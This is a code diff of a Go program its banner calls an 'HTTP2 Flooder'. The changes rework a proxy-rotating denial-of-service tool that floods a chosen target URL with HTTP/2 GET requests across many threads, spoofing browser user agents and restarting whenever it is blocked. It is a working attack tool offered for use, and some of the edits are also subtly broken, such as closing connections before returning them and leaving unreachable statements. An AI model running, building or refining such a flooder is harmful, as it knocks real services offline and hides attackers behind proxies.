@@ -9,15 +9,15 @@ import (
     "strconv"
     "crypto/tls"
     "math/rand"
-    "sync"
     "net"
     "bufio"
     "strings"
+    "sync"
 )
 
 var proxies = []string{}
 
-func http2(wg * sync.WaitGroup, target string, rps int) {
+func http2(target string, rps int) {
     restart: 
     proxy := fmt.Sprintf("http://%s", proxies[rand.Intn(len(proxies))])
     config := &tls.Config{
@@ -48,9 +48,12 @@ func http2(wg * sync.WaitGroup, target string, rps int) {
       Proxy: http.ProxyURL(url),
       ForceAttemptHTTP2: true,
       TLSClientConfig: config,
+      MaxIdleConns:        -1,
+      MaxIdleConnsPerHost: -1,
+      IdleConnTimeout:     1 * time.Hour,
       Dial: (&net.Dialer{
-        Timeout:   30 * time.Second,
-        KeepAlive: 30 * time.Second,
+        Timeout:   5 * time.Second,
+        KeepAlive: 1 * time.Hour,
         DualStack: true,
       }).Dial,
       DialTLS: func(network, addr string) (net.Conn, error) {
@@ -59,20 +62,34 @@ func http2(wg * sync.WaitGroup, target string, rps int) {
 			  }
 			  conn, err := dialer.Dial(network, addr)
 			  if err != nil {
+          defer conn.Close()
 				  return nil, err
 			  }
+        defer conn.Close()
 			  tlsConn := tls.Client(conn, config)
 			  err = tlsConn.Handshake()
 			  if err != nil {
+          defer tlsConn.Close()
 				  return nil, err
 			  }
+        defer tlsConn.Close()
 			  return tlsConn, nil
 		  },
     }
     client := http.Client{
         Transport: httptransport,
+        Timeout: 5 * time.Second,
+        CheckRedirect: func(req *http.Request, via []*http.Request) error {
+            if len(via) >= 3 {
+                return nil
+            }
+            return nil
+        },
     }
-    req, _ := http.NewRequest("GET", target, nil)
+    req, err := http.NewRequest("GET", target, nil)
+    if err != nil {
+      goto restart
+    }
     version := rand.Intn(20) + 95
     userAgents := []string{fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0", version, version), fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", version)}
     userAgent := rand.Intn(len(userAgents))
@@ -93,17 +110,32 @@ func http2(wg * sync.WaitGroup, target string, rps int) {
         resp, err := client.Do(req)
         if err != nil {
             goto restart
+            break
         }
+        defer resp.Body.Close()
         if resp.StatusCode >= 400 && resp.StatusCode != 404 {
             goto restart
+            break
         }
     }
-    defer wg.Done()
+}
+
+func sendRequests(target string, rps int, quit chan struct{}) {
+    for {
+        select {
+        case <-quit:
+            return
+        default:
+            http2(target, rps)
+        }
+    }
 }
 
 func main() {
-    rand.Seed(time.Now().UnixNano())
-    if len(os.Args) < 5 {
+    go func() {
+      rand.Seed(time.Now().UnixNano())
+    }()
+    if len(os.Args) < 6 {
         fmt.Println(fmt.Sprintf("\033[34mHTTP2 Flooder \033[0m- \033[33mMade by @udbnt\033[0m\n\033[31m%s target, duration, rps, proxylist, threads\033[0m", os.Args[0]))
         return
     }
@@ -112,38 +144,41 @@ func main() {
     var rps int
     var proxylist string
     var threads int
-    var wg sync.WaitGroup
     target = os.Args[1]
     duration, _ = strconv.Atoi(os.Args[2])
     rps, _ = strconv.Atoi(os.Args[3])
     proxylist = os.Args[4]
     threads, _ = strconv.Atoi(os.Args[5])
-    
+
     file, err := os.Open(proxylist)
     if err != nil {
         fmt.Println("Error reading file:", err)
         return
     }
     defer file.Close()
-    
+
     scanner := bufio.NewScanner(file)
     for scanner.Scan() {
         proxies = append(proxies, strings.TrimSpace(scanner.Text()))
     }
-    
+
     if len(proxies) == 0 {
-        fmt.Println("No proxies found in file")
+        fmt.Println("No proxies found in the file")
         return
     }
 
+    quit := make(chan struct{})
+    var wg sync.WaitGroup
     for i := 0; i < threads; i++ {
         wg.Add(1)
-        go http2(&wg, target, rps)
-        time.Sleep(1 * time.Millisecond)
+        go func() {
+            defer wg.Done()
+            sendRequests(target, rps, quit)
+        }()
+        time.Sleep(time.Duration(1) * time.Millisecond)
     }
-    go func() {
-      time.Sleep(time.Duration(duration) * time.Second)
-      os.Exit(0)
-    }()
+
+    time.Sleep(time.Duration(duration) * time.Second)
+    close(quit)
     wg.Wait()
 }
